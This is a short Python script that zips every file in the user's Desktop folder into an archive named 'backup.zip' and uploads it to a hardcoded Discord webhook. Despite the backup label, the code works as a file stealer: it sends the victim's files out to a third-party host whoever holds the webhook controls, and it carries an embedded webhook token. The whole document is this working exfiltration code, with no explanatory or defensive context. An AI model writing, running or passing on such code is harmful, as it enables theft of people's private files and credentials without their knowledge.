import requests
import zipfile
import os

webhook = "https://discord.com/api/webhooks/1478021770274537595/X0jOMoKKsedBZDMQ5LByfrPKSbRJJRzdcHAPDabwaTv7GUNXXmcpRZJdc68tOyoWKpI0"

folder = os.path.expanduser("~/Desktop")
zip_name = "backup.zip"

with zipfile.ZipFile(zip_name, "w") as z:
    for root, dirs, files in os.walk(folder):
        for f in files:
            path = os.path.join(root, f)
            z.write(path)

with open(zip_name, "rb") as f:
    requests.post(webhook, files={"file": f})